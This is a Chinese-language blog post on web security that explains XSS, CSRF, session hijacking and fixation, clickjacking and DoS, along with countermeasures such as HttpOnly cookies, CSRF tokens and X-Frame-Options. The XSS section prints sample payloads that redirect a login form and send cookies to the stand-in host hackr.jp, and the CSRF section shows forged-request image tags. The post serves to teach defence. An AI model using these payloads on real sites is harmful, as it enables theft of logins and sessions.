---
title:  "Web安全策略"
image: /assets/img/blog/Website-attacks.jpg
description: >
  Watch out your password!!!
author: author2
comments: true
---

互联网作为一个面向全世界的开放平台，不可避免会存在很多的漏洞，及时发现并修复漏洞对维护网站稳定性，避免或减少客户损失就显得分外重要，常见的Web攻击方式有：XSS、CSRF、Session攻击、点击劫持、DDos、脚本注入、SQL注入、DNS劫持、端口漏洞扫描、密码暴力破解等。下面简要分析了几种常见的Web攻击类型。

### 一、跨站脚本攻击（XSS）

​        跨站脚本攻击是指通过存在安全漏洞的Web网站注册用户的浏览器运行非法的HTML标签或JavaScript进行的一种攻击。动态创建的HTML部分有可能隐藏着安全漏洞。就这样，当攻击者编写脚本，设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。

​        跨站脚本攻击有可能造成以下影响：

- **利用虚假信息骗取用户个人信息**
- **利用脚本窃取用户的Cookie值，被害人在不知情的情况下，帮攻击者发送恶意请求。**
- **显示伪造的文章或图片。**

​        跨站脚本攻击案例

#####         1. 在动态生成的HTML处发生

​        在编辑个人信息的页面处输入<s>Username</s>，此时的确认界面上，浏览器会把用户输入的<s>解析成HTML标签，然后显示出删除线，删除线的显示不会造成太大的不利影响，但如果换成使用<script>标签将会带来不可估量的影响。

#####         2. 利用预先设置的陷阱触发的被动攻击

​        当通过地址栏中的URL的查询字段指定ID时，相当于在表单内自动填写字符串的功能，此时隐藏着可执行跨站脚本攻击的漏洞。如果攻击者创建嵌入恶意代码的URL。并隐藏植入事先准备好的欺诈邮件中或Web页面内，诱使用户去点击该URL。

```html
http://example.jp/login?ID="><script>var+
f=document.getElementById("login");+
f.action="http://hackr.jp/pwget";+
f.method="get";</script><span+s="
```

​        浏览器打开该URL后，直观感觉没产生什么影响，但设置好的脚本却偷偷开始运行了。当用户在表单内输入ID和密码后，就会直接发送到攻击者的网站，导致个人登陆信息被窃取。之后，ID及密码会传给该正规网站，而在接下来仍然是按正常登陆的步骤，用户很难意识到自己的登陆信息已遭泄露。

#####         3. 对用户Cookie的窃取攻击

```javascript
//xss.js
var content=escape(document.cookies);
document.write("<img src='http://hackr.jp/?'");
document.write(content);
document.write(">");
<script src="http://hackr.jp/xss.js"></script>
```

​        在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段Javascript程序，即可访问到该Web应用所处域名下的Cookie信息。然后这些信息就会发送至攻击者的Web网站，记录在他的登陆日志中。这样，攻击者就可以窃取到用户的Cookie信息了。

```javascript
http://example.jp/login?ID="><script src='http://hackr.jp/xss.js'></script>"
```

​        **防御方案：**

- 设置Cookie的HttpOnly属性，它使javascript脚本无法获得Cookie

```http
Set-Cookie: name=value; HttpOnly
```

​        设置后，通常还可以从Web页面对Cookie进行读取操作。但使用Javascript的document.cookie就无法读取附加HttpOnly属性后的Cookie内容了。

- 首部字段X-XSS-Protection

```http
X-XSS-Protection: 1
```

​        该首部字段是HTTP响应首部，它是针对跨站脚本攻击的一种对策，用于控制浏览器XSS的防护机制的开关。0：将XSS过滤设置成无效状态。1：将XSS过滤设置成有效状态。 

- 过滤或移除特殊的HTML标签，如<script><iframe>，<、>、"等用实体&lt、&gt、&quot替代。
- 对页面提交的内容进行HTML Encode转义处理

​       用户提交的数据进行HTML编码，将相应的符号转换为实体名称再进行下一步处理。

- URL上提交的内容做URL Encode转义

- 过滤JavaScript事件的标签。例如"onclick="，"onfocus"等等。
- 表单数据规定值的类型，例如年龄只能为int，name只能为字母数字下划线组合
- 注册登录入口做好人机识别(各种验证码)
- 服务器只开放必要端口：如80、443、22

### 二、跨站点请求伪造（XSRF）

​        跨站点请求伪造攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新。

​        跨站点请求伪造可能造成如下影响：

- **利用已通过认证的用户权限更新设定信息等**
- **利用已通过认证的用户权限购买商品、虚拟货币转账等**
- **利用已通过认证的用户权限在留言板上发表评论**

​        跨站点请求伪造的攻击案例

#####          1. 银行转账

​        受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 http://bank.example/withdraw?account=bob&amount=1000000&for=bob2 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。

​        黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。

​        这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 

#####         2. 留言板功能

​        在留言板系统上 ，受害者用户A是已认证状态，在他的浏览器中的Cookie持有已认证的会话ID

```http
GET/HTTP/1.1
Host: example.com
Cookie: sid=1234567890
```

​        攻击者在留言板上发表含有恶意代码的评论

```http
<img src="http://example.com/msg?q=你好">
```

​        设置好后一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A的浏览器在完成陷阱中的请求后，留言板上也就会留下那条评论。用户A的浏览器中的Cookie持有已认证的会话ID，利用用户A的权限执行发表动作。

```http
GET/msg?q=你好 HTTP/1.1
Host: example.com
Cookie: sid=1234567890
```

​        **防御方案**

- **验证HTTP Referer字段**

​        首部字段Referer会告知服务器请求的原始资源的URI。通常，访问一个安全受限页面的请求来自于同一网站，比如访问http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory，用户必须首先登陆bank.example域名开头的地址。然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。

​        这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。

​        然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。

​        即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。客户端一般都会发送Referer首部字段给服务器。但当直接在浏览器的地址栏中输入URI，原始资源的URI中的查询字符串可能含有ID和密码等保密信息，要是写进Referer转发给其他服务器，则有可能导致保密信息的泄漏。除此之外，由于 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。

- **在请求地址中添加Token并验证**

​         CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

​        这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 以参数的形式加入请求。对于 GET 请求，token 将附在请求地址之后，这样 URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上 <input type=”hidden” name=”csrftoken” value=”tokenvalue”/>，这样就把 token 以参数的形式加入请求了。但是，在一个网站中，可以接受请求的地方非常多，要对于每一个请求都加上 token 是很麻烦的，并且很容易漏掉，**通常使用的方法就是在每次页面加载时，使用 javascript 遍历整个 dom 树，对于 dom 中所有的 a 和 form 标签后加入 token**。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的 html 代码，这种方法就没有作用，还需要程序员在编码时手动添加 token。

​         该方法还有一个缺点是难以保证 token 本身的安全。特别是在一些论坛之类支持用户自己发表内容的网站，黑客可以在上面发布自己个人网站的地址。由于系统也会在这个地址后面加上 token，黑客可以在自己的网站上得到这个 token，并马上就可以发动 CSRF 攻击。为了避免这一点，系统可以在添加 token 的时候增加一个判断，如果这个链接是链到自己本站的，就在后面添加 token，如果是通向外网则不加。不过，**即使这个 csrftoken 不以参数的形式附加在请求之中，黑客的网站也同样可以通过 Referer 来得到这个 token 值以发动 CSRF 攻击。这也是一些用户喜欢手动关闭浏览器 Referer 功能的原因。**

- **在HTTP头中自定义属性并验证**

​       这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。

​        然而这种方法的局限性非常大。XMLHttpRequest 请求通常用于 Ajax 方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，而且通过该类请求得到的页面不能被浏览器所记录下，从而进行前进，后退，刷新，收藏等操作，给用户带来不便。另外，对于没有进行 CSRF 防护的遗留系统来说，要采用这种方法来进行防护，要把所有请求都改为 XMLHttpRequest 请求，这样几乎是要重写整个网站，这代价无疑是难以令人接受的。

###  三、Session攻击

#####         1. 会话劫持攻击

​        会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的。

​        具备认证功能的Web应用，使用会话ID的会话管理机制，作为管理认证状态的主流方式。会话ID中记录客户端的Cookie等信息，服务端将会话ID与认证状态进行一对一匹配管理。

​        有下面几种攻击者获取会话ID的途径。

- 通过非正规的生成方法推测会话ID
- 通过窃听或XSS攻击盗取会话ID
- 通过会话固定攻击（Session Fixation）强行获取会话ID

​        **攻击步骤：**

![img](https://images2018.cnblogs.com/blog/1435929/201807/1435929-20180714120256072-239053955.png)

​        **会话劫持攻击案例**

​         以认证功能为例，通过会话管理机制，会将成功认证的用户的会话ID（SID）保存在用户浏览器的Cookie中。

​        攻击者在得知该Web网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用Javascript脚本调用document.cookie以窃取Cookie信息的陷阱，一旦用户踏入了这个陷阱，攻击者就能获取含有会话ID的Cookie。攻击者拿到用户的会话ID后，往自己的浏览器的Cookie中设置该会话ID，即可伪装成会话ID遭窃的用户，访问Web网站了。

​        **会话劫持防护：**

- 关闭透明化的SessionID。透明化的SessionID指当浏览器中的HTTP请求没有使用Cookie来存放SessionID时，SessionID则使用URL来传递。
- 设置HttpOnly。通过设置Cookie的HttpOnly，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击，进而防止Cookie的非法窃取。
- 验证HTTP头部信息。在http访问头文件中：[Accept-Charset、Accept-Encoding、Accept-Language、User-Agent]，一般浏览器发出的头部不会改变。

​        确保User-Agent头部信息一致的确是有效的，如果会话标识通过cookie传递，攻击者能取得会话标识，他同时也能取得其它HTTP头部。由于cookie暴露与浏览器漏洞或跨站脚本漏洞相关，受害者需要访问攻击者的网站并暴露所有头部信息。则攻击者只需**重建头部即可进行攻击了**。

- 需要先做好XSS防御。

#####          2. 会话固定攻击

​        对以窃取目标会话ID为主要攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话ID，属于被动攻击。让合法用户使用黑客预先设置的SessionID进行登录，从而使Web不再进行生成新的SessionID，从而导致黑客设置的SessionID变成了合法桥梁。会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击主要目的同样是获得目标用户的合法会话，不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。

​        攻击步骤：

![img](https://images2018.cnblogs.com/blog/1435929/201807/1435929-20180714140342571-257118842.png)

​        会话固定攻击案例：

​        仍以认证功能为例，对Web网站的认证功能，会在认证前发布一个会话ID，若认证成功，就会在服务器内改变认证状态。

​        攻击者准备陷阱，先访问Web网站拿到会话ID（假设是SID=f5d1278e8109)，此刻，会话ID在服务器上的记录仍然是未认证状态；攻击者设置好强制用户使用该会话ID的陷阱，并等待用户拿着这个会话ID前去认证。一旦用户触发陷阱并完成认证，会话ID（SID=f5d1278e8109）在服务器上的状态就会被记录下来；攻击者估计用户差不多已经触发陷阱后，再利用之前这个会话ID访问网站，由于该会话ID目前已是用户认证状态，于是攻击者作为用户的身份顺利登陆网站。

​        会话固定防御

​        1. 每当用户登陆的时候就进行重置SessionID

​        2. SessionID闲置过久时，进行重置SessionID

​        3. 大部分防止会话劫持的方法对固定攻击同样有效。如设置HttpOnly、关闭透明化SessionID、User-Agent验证、Token校验等。

### 四、点击劫持

​        点击劫持（Clickjacking）是指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上。然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。这种行为又称为界面伪装。已设置陷阱的Web页面，表面上内容并无不妥，但早已埋入诱导链接。当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的iframe页面。

​        防御方法：

- 利用header("X-Frame-Options:DENY");

​        DENY：表示拒绝浏览器加载任何frame页面，

​        SAMEORIGIN：表示frame页面地址只能是同源域名下的页面，

​        ALLOW-FROM origin可自定义允许frame加载页面地址。

- 通过写一段javascript代码来禁止iframe的嵌套，这种方法叫做frame busting。

```javascript
if ( top.location != location ) {
    top.location = self.location;
}
//常见的frame busting有一下方式：
if (top != self)
if (top.location != self.location)
if (top.location != location)
if (parent.frames.length > 0)
if (window != top)
if (window.top !== window.self)
if (window.self != window.top)
if (parent && parent != window)
if (parent && parent.frames && parent.frames.length>0)
if((self.parent && !(self.parent===self)) && (self.parent.frames.le
ngth!=0))
top.location = self.location
top.location.href = document.location.href
top.location.href = self.location.href
top.location.replace(self.location)
top.location.href = window.location.href
top.location.replace(document.location)
top.location.href = window.location.href
top.location.href = "URL"
document.write('')
top.location = location
top.location.replace(document.location)
top.location.replace('URL')
top.location.href = document.location
top.location.replace(window.location.href)
top.location.href = location.href
self.parent.location = document.location
parent.location.href = self.document.location
parent.location = self.location;
```

​        由于这种方法存在被绕过的可能性，因此最好用第一种方法。

### 五、DOS攻击

​        DOS攻击(Denial of Service attack)是一种让运行中的服务呈停止状态的攻击。有时也叫做服务停止攻击或拒绝服务攻击。DOS攻击的对象不仅限于Web网站，还包括网络设备及服务器等。主要有以下两种DOS攻击方式：

​        1. 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就处于停止状态。

​        2.通过攻击安全漏洞使服务停止

 解决方案：设置路由器与交换机的安全配置，设置防火墙。

### 参考：

https://blog.csdn.net/stpeace/article/details/53512283